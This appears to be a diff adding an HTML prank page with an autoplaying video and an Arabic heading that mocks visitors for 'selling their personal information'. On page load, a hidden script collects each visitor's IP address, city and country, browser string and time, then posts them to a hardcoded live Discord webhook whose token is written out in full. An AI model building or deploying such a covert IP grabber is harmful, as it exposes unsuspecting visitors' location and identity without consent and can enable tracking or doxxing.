@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOUSA</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h3>نشكرك على بيع معلوماتك الشخصية لنا </h3>
+    <video autoplay loop muted playsinline>
+        <source src="sousavid.mp4" type="video/mp4">
+        Your browser does not support the <code>video</code> element.
+    </video>
+
+    <script>
+        // Your Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1312831399837044746/ilKwGQY-LVq3VSgGSNoJZ8UMe7CFGl62SzCS52M7JMUyMpVEB_GnduYdwao7dHxU3FcW";
+
+        // Function to send a message to Discord
+        function sendToDiscord(message) {
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ content: message }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Message sent to Discord!");
+                } else {
+                    console.error("Error sending message:", response.status);
+                }
+            })
+            .catch(error => console.error("Network error:", error));
+        }
+
+        // Function to get user data
+        function getUserInfo() {
+            const date = new Date().toLocaleString(); // Current date and time
+            const browser = navigator.userAgent; // Browser info
+
+            // Getting location using ip-api
+            fetch("http://ip-api.com/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const location = `${data.city}, ${data.country}`; // City, Country
+                    const ip = data.query; // IP Address
+                    const message = `
+                        New visitor on your site:
+                        - Date: ${date}
+                        - Browser: ${browser}
+                        - Location: ${location}
+                        - IP Address: ${ip}
+                    `;
+                    sendToDiscord(message); // Send to Discord
+                })
+                .catch(error => {
+                    console.error("Error getting location:", error);
+                    const message = `
+                        New visitor on your site:
+                        - Date: ${date}
+                        - Browser: ${browser}
+                        - Location: Error fetching location
+                    `;
+                    sendToDiscord(message); // Send error data to Discord
+                });
+        }
+
+        // Call the function when the page loads
+        getUserInfo();
+    </script>
+</body>
+</html>
